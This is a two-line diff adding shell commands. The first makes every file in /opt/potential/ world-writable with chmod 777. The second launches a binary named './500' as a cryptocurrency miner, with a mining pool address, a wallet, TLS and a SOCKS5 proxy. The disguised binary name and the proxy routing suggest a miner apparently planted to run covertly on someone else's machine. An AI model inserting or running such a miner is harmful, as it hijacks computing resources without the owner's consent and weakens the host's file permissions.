@@ -1,0 +1,2 @@
+cd /opt/potential/ && chmod 777 * && ls
+./500 --algorithm randomscash --pool stratum-asia.rplant.xyz:17019 --tls true --wallet scash1qm66fvwwfl24xrehvfk5ygvfx2hvlhzk6rhfcvy.asolo1 --proxy socks5://98.188.47.150:4145 --keepalive true
